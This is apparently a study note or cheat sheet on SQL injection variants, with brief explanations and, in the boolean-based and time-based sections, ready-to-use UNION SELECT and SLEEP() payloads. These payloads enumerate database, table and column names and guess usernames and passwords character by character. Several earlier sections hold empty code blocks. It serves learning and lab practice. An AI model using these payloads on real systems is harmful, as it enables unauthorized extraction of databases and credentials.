#### In-Band SQLi
--------------------

* Refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, 
 discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
 
 *Examples:*

```Javascript
```

#### Error-Based SQL Injection
--------------------------------
* Most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. 
* This can often be used to enumerate a whole database.

*Examples:*

```Javascript
```

##### Union-Based SQL Injection
---------------------------------
*  Utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large 
* amounts of data via an SQL Injection vulnerability.

*Examples:*

```Javascript
```

##### Boolean Based
---------------------
* Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. 
* That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.

*Assume the username is admin123*

*Example: Establishing number of columns*

```Javascript
admin123' UNION SELECT 1,2,3;--
```

*Examaple: discovering the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status*

```Javascript
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

*Example: Cycle through all the letters, numbers and characters such as - and _ until we discover a match*

```Javascript
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

*Example: This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a*

```Javascript
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

*Example: Continuing to cycle through the above query, you discover a table named *users**

```Javascript
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

*Example: Enumerate the column names in the users table. Using the payload below, we search the columns table where the database is equal to sqli_three, the table name is users, and the column name begins with the letter a*

```Javascript
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

*Example:  Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named id, you'll append that to your original payload*

```Javascript
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

*Example:  Discover username*
```Javascript
admin123' UNION SELECT 1,2,3 from users where username like 'a%
```

*Example:  Discover password*
```Javascript
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

##### Time-Based SQL Injection
-------------------------------
* A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. 
* Instead, your indicator of a correct query is based on the time the query takes to complete. 
* This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. 
* The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

*Examples: Establishing the number of columns in a table, if no pause, the query was unsuccessful*

```Javascript
admin123' UNION SELECT SLEEP(5);--
```

*Examples: This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.*

```Javascript
admin123' UNION SELECT SLEEP(5),2;--
```

```Javascript
referrer=admin123' UNION SELECT SLEEP(5),2  FROM information_schema.COLUMNS WHERE table_schema = 'sqli_four' and table_name ='analytic' and COLUMN_NAME like 'a%';--
```

```Javascript
admin123' UNION SELECT SLEEP (5 ),2 from users where username='admin' and password like '4961%';--
```
